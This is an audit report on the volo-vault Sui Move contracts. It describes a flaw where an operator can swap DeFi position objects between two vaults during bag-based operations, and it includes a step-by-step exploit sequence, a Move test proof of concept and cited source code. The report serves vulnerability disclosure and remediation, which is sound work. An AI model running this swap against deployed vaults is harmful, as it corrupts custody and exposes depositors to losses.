# Audit Report

## Title
Cross-Vault Asset Contamination via Insufficient Asset Identity Verification

## Summary
The vault operation system fails to verify that returned DeFi asset objects are the same instances that were borrowed. An operator with legitimate `OperatorCap` can exploit this by swapping DeFi asset objects between two vaults during concurrent operations using standard Sui `Bag` operations, permanently corrupting the custody mapping of both vaults.

## Finding Description

The vault operation flow has a critical gap in asset identity verification across three functions:

**Borrowing Phase:** `start_op_with_bag()` removes DeFi assets from a vault by string key and places them in a `Bag` object returned to the operator. [1](#0-0) 

The operator receives mutable ownership of this Bag during the transaction, which they can manipulate using standard `sui::bag` module functions.

**Return Phase:** `end_op_with_bag()` accepts assets from the operator's Bag and calls `return_defi_asset()` to add them back to the vault. [2](#0-1) 

The `return_defi_asset()` function accepts ANY asset object of the correct type and blindly adds it to the vault's bag without verifying object identity: [3](#0-2) 

**Validation Phase:** `end_op_value_update_with_bag()` validates assets were returned by only checking key existence via `contains_asset_type()`. [4](#0-3) 

The `contains_asset_type()` function only checks if a key exists in the bag, not whether the correct asset instance is present: [5](#0-4) 

**Exploit Scenario:**

An operator can execute the following in a single Sui Programmable Transaction Block:

1. Call `start_op_with_bag()` on VaultA → receives `bag_A` containing AssetA at key "NaviAccountCap0"
2. Call `start_op_with_bag()` on VaultB → receives `bag_B` containing AssetB at key "NaviAccountCap0"
3. Use `sui::bag::remove()` and `sui::bag::add()` to swap: put AssetB into `bag_A` and AssetA into `bag_B`
4. Call `end_op_with_bag()` on VaultA with swapped `bag_A` → returns AssetB to VaultA
5. Call `end_op_with_bag()` on VaultB with swapped `bag_B` → returns AssetA to VaultB
6. Call `end_op_value_update_with_bag()` on both vaults → both pass validation because keys exist

The vault_id checks at line 227 pass because each vault is called with its correct `TxBag` structure, which tracks only the vault_id and key names, not asset object identities. [6](#0-5) 

This breaks the fundamental custody invariant: "All borrowed DeFi assets returned with correct identity." The assets are of correct types but wrong instances.

## Impact Explanation

**CRITICAL Severity** - This violates the core custody guarantee of the vault system:

1. **Permanent Custody Corruption**: VaultA now controls VaultB's Navi lending position (with its specific collateral/debt), Cetus LP position (with its liquidity range), or Suilend obligation (with its borrowing state). These positions cannot be undone without protocol-level intervention.

2. **Risk Profile Misalignment**: Users who deposited into VaultA expecting its risk parameters now have their funds managed using VaultB's DeFi positions, which may have entirely different collateralization ratios, debt levels, or liquidation risks.

3. **Accounting Fraud**: Each vault calculates `total_usd_value` and share prices based on assets it claims to own but doesn't actually control. This creates phantom value or hidden liabilities in accounting.

4. **Cross-Contamination**: If VaultB's Navi position has high debt and faces liquidation, VaultA users unknowingly inherit that liquidation risk despite having no relationship with VaultB.

5. **Undetectable**: The validation mechanism has no way to detect this corruption since it only verifies key existence. Event emissions and on-chain data would show normal operation.

All users of both contaminated vaults are affected - they lose the fundamental guarantee that their proportional share of vault assets corresponds to the actual DeFi positions the vault controls.

## Likelihood Explanation

**HIGH Likelihood** - This requires only:

- **Attacker Profile**: Legitimate operator with `OperatorCap` (not a compromised role)
- **Privilege Scope Issue**: The operator's privileges are too broad - they receive mutable `Bag` objects they can manipulate using standard Sui framework functions
- **Complexity**: LOW - The attack uses only public `sui::bag` module functions and vault operations in a straightforward PTB sequence
- **Preconditions**: Two vaults exist with DeFi assets of the same type (common in production)
- **Execution**: Can be performed atomically in a single Sui Programmable Transaction Block
- **Detection**: NONE - The validation logic has no mechanism to detect wrong asset instances

This is a **mis-scoped privilege vulnerability** rather than a malicious operator assumption. The protocol grants operators the technical capability to perform this swap due to insufficient validation of returned asset object identities.

## Recommendation

Add object identity verification to the `return_defi_asset()` function by tracking borrowed object IDs and verifying they match on return:

1. Extend `OperationValueUpdateRecord` to track borrowed asset object IDs
2. In `borrow_defi_asset()`, record the object ID of each borrowed asset
3. In `return_defi_asset()`, verify the returned asset's object ID matches the borrowed one
4. Alternatively, use a different data structure that maintains object identity binding throughout the operation lifecycle

## Proof of Concept

```move
#[test]
public fun test_cross_vault_asset_swap_exploit() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Initialize two vaults (VaultA and VaultB)
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_vault<USDC_TEST_COIN>(&mut s);
    
    // Add NaviAccountCap0 to VaultA
    s.next_tx(OWNER);
    {
        let mut vaultA = s.take_shared<Vault<SUI_TEST_COIN>>();
        let navi_cap_A = lending::create_account(s.ctx());
        vaultA.add_new_defi_asset(0, navi_cap_A);
        test_scenario::return_shared(vaultA);
    };
    
    // Add NaviAccountCap0 to VaultB
    s.next_tx(OWNER);
    {
        let mut vaultB = s.take_shared<Vault<USDC_TEST_COIN>>();
        let navi_cap_B = lending::create_account(s.ctx());
        vaultB.add_new_defi_asset(0, navi_cap_B);
        test_scenario::return_shared(vaultB);
    };
    
    // Exploit: Swap assets between vaults
    s.next_tx(OWNER);
    {
        let operation = s.take_shared<Operation>();
        let mut vaultA = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut vaultB = s.take_shared<Vault<USDC_TEST_COIN>>();
        let cap = s.take_from_sender<OperatorCap>();
        
        // Start operations on both vaults
        let (mut bag_A, tx_A, tx_update_A, _, _) = operation::start_op_with_bag<SUI_TEST_COIN, USDC_TEST_COIN, SUI_TEST_COIN>(
            &mut vaultA, &operation, &cap, &clock,
            vector[0], vector[type_name::get<NaviAccountCap>()], 0, 0, s.ctx()
        );
        
        let (mut bag_B, tx_B, tx_update_B, _, _) = operation::start_op_with_bag<USDC_TEST_COIN, SUI_TEST_COIN, USDC_TEST_COIN>(
            &mut vaultB, &operation, &cap, &clock,
            vector[0], vector[type_name::get<NaviAccountCap>()], 0, 0, s.ctx()
        );
        
        // Swap assets between bags
        let asset_A = bag::remove<String, NaviAccountCap>(&mut bag_A, vault_utils::parse_key<NaviAccountCap>(0));
        let asset_B = bag::remove<String, NaviAccountCap>(&mut bag_B, vault_utils::parse_key<NaviAccountCap>(0));
        bag::add(&mut bag_A, vault_utils::parse_key<NaviAccountCap>(0), asset_B);
        bag::add(&mut bag_B, vault_utils::parse_key<NaviAccountCap>(0), asset_A);
        
        // Return swapped assets - this should fail but doesn't!
        operation::end_op_with_bag(&mut vaultA, &operation, &cap, bag_A, tx_A, balance::zero(), balance::zero());
        operation::end_op_with_bag(&mut vaultB, &operation, &cap, bag_B, tx_B, balance::zero(), balance::zero());
        
        // Validation passes because only key existence is checked
        operation::end_op_value_update_with_bag(&mut vaultA, &operation, &cap, &clock, tx_update_A);
        operation::end_op_value_update_with_bag(&mut vaultB, &operation, &cap, &clock, tx_update_B);
        
        // VaultA now has VaultB's asset and vice versa - custody corruption!
        
        s.return_to_sender(cap);
        test_scenario::return_shared(vaultA);
        test_scenario::return_shared(vaultB);
        test_scenario::return_shared(operation);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

### Citations

**File:** volo-vault/sources/operation.move (L94-207)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);

    let mut defi_assets = bag::new(ctx);

    let defi_assets_length = defi_asset_ids.length();
    assert!(defi_assets_length == defi_asset_types.length(), ERR_ASSETS_LENGTH_MISMATCH);

    let mut i = 0;
    while (i < defi_assets_length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = vault.borrow_defi_asset<T, NaviAccountCap>(
                vault_utils::parse_key<NaviAccountCap>(defi_asset_id),
            );
            defi_assets.add<String, NaviAccountCap>(navi_asset_type, navi_account_cap);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            let cetus_position = vault.borrow_defi_asset<T, CetusPosition>(cetus_asset_type);
            defi_assets.add<String, CetusPosition>(cetus_asset_type, cetus_position);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let obligation_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            let obligation = vault.borrow_defi_asset<T, SuilendObligationOwnerCap<ObligationType>>(
                obligation_asset_type,
            );
            defi_assets.add<String, SuilendObligationOwnerCap<ObligationType>>(
                obligation_asset_type,
                obligation,
            );
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = vault.borrow_defi_asset<T, MomentumPosition>(
                momentum_asset_type,
            );
            defi_assets.add<String, MomentumPosition>(momentum_asset_type, momentum_position);
        };

        if (defi_asset_type == type_name::get<Receipt>()) {
            let receipt_asset_type = vault_utils::parse_key<Receipt>(defi_asset_id);
            let receipt = vault.borrow_defi_asset<T, Receipt>(receipt_asset_type);
            defi_assets.add<String, Receipt>(receipt_asset_type, receipt);
        };

        i = i + 1;
    };

    let principal_balance = if (principal_amount > 0) {
        vault.borrow_free_principal(principal_amount)
    } else {
        balance::zero<T>()
    };

    let coin_type_asset_balance = if (coin_type_asset_amount > 0) {
        vault.borrow_coin_type_asset<T, CoinType>(
            coin_type_asset_amount,
        )
    } else {
        balance::zero<CoinType>()
    };

    let total_usd_value = vault.get_total_usd_value(clock);
    let total_shares = vault.total_shares();

    let tx = TxBag {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
    };

    let tx_for_check_value_update = TxBagForCheckValueUpdate {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        total_usd_value,
        total_shares,
    };

    emit(OperationStarted {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount,
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount,
        total_usd_value,
    });

    (defi_assets, tx, tx_for_check_value_update, principal_balance, coin_type_asset_balance)
}
```

**File:** volo-vault/sources/operation.move (L209-297)
```text
public fun end_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    mut defi_assets: Bag,
    tx: TxBag,
    principal_balance: Balance<T>,
    coin_type_asset_balance: Balance<CoinType>,
) {
    vault::assert_operator_not_freezed(operation, cap);
    vault.assert_during_operation();

    let TxBag {
        vault_id,
        defi_asset_ids,
        defi_asset_types,
    } = tx;

    assert!(vault.vault_id() == vault_id, ERR_VAULT_ID_MISMATCH);

    let length = defi_asset_ids.length();
    let mut i = 0;
    while (i < length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = defi_assets.remove<String, NaviAccountCap>(navi_asset_type);
            vault.return_defi_asset(navi_asset_type, navi_account_cap);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            let cetus_position = defi_assets.remove<String, CetusPosition>(cetus_asset_type);
            vault.return_defi_asset(cetus_asset_type, cetus_position);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            let obligation = defi_assets.remove<String, SuilendObligationOwnerCap<ObligationType>>(
                suilend_asset_type,
            );
            vault.return_defi_asset(suilend_asset_type, obligation);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = defi_assets.remove<String, MomentumPosition>(
                momentum_asset_type,
            );
            vault.return_defi_asset(momentum_asset_type, momentum_position);
        };

        if (defi_asset_type == type_name::get<Receipt>()) {
            let receipt_asset_type = vault_utils::parse_key<Receipt>(defi_asset_id);
            let receipt = defi_assets.remove<String, Receipt>(receipt_asset_type);
            vault.return_defi_asset(receipt_asset_type, receipt);
        };

        i = i + 1;
    };

    emit(OperationEnded {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount: principal_balance.value(),
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount: coin_type_asset_balance.value(),
    });

    vault.return_free_principal(principal_balance);

    if (coin_type_asset_balance.value() > 0) {
        vault.return_coin_type_asset<T, CoinType>(coin_type_asset_balance);
    } else {
        coin_type_asset_balance.destroy_zero();
    };

    vault.enable_op_value_update();

    defi_assets.destroy_empty();
}
```

**File:** volo-vault/sources/operation.move (L299-377)
```text
public fun end_op_value_update_with_bag<T, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    tx: TxBagForCheckValueUpdate,
) {
    vault::assert_operator_not_freezed(operation, cap);
    vault.assert_during_operation();

    let TxBagForCheckValueUpdate {
        vault_id,
        defi_asset_ids,
        defi_asset_types,
        total_usd_value,
        total_shares,
    } = tx;

    assert!(vault.vault_id() == vault_id, ERR_VAULT_ID_MISMATCH);

    // First check if all assets has been returned
    let length = defi_asset_ids.length();
    let mut i = 0;
    while (i < length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            assert!(vault.contains_asset_type(navi_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(cetus_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            assert!(vault.contains_asset_type(suilend_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(momentum_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        i = i + 1;
    };

    let total_usd_value_before = total_usd_value;
    vault.check_op_value_update_record();
    let total_usd_value_after = vault.get_total_usd_value(
        clock,
    );

    // Update tolerance if there is a loss (there is a max loss limit each epoch)
    let mut loss = 0;
    if (total_usd_value_after < total_usd_value_before) {
        loss = total_usd_value_before - total_usd_value_after;
        vault.update_tolerance(loss);
    };

    assert!(vault.total_shares() == total_shares, ERR_VERIFY_SHARE);

    emit(OperationValueUpdateChecked {
        vault_id: vault.vault_id(),
        total_usd_value_before,
        total_usd_value_after,
        loss,
    });

    vault.set_status(VAULT_NORMAL_STATUS);
    vault.clear_op_value_update_record();
}
```

**File:** volo-vault/sources/volo_vault.move (L1346-1351)
```text
public(package) fun contains_asset_type<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): bool {
    self.assets.contains(asset_type)
}
```

**File:** volo-vault/sources/volo_vault.move (L1436-1449)
```text
public(package) fun return_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    asset: AssetType,
) {
    self.check_version();

    emit(DefiAssetReturned {
        vault_id: self.vault_id(),
        asset_type: asset_type,
    });

    self.assets.add<String, AssetType>(asset_type, asset);
}
```
